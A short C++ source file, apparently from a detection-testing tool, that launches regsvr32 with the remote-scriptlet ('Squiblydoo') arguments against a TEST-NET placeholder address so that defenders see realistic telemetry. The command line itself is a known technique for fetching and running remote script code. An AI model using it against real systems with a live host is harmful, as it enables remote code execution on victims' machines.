/**
 * @file LolbinExecution.cpp
 * @brief Simulates LOLBIN abuse through regsvr32 remote scriptlet syntax.
 *
 * The program starts regsvr32 with remote scriptlet indicators against a
 * TEST-NET address, producing realistic command-line telemetry without hosting
 * or executing a scriptlet.
 */

#include "Common.hpp"

int wmain() {
   std::wcout << L"vigil lolbin_execution regsvr32 scriptlet-shaped simulation\n";
   return vigil::examples::run_process(vigil::examples::system32(L"regsvr32.exe"),
                                       L"/s /n /u /i:http://192.0.2.1/a.sct scrobj.dll");
}
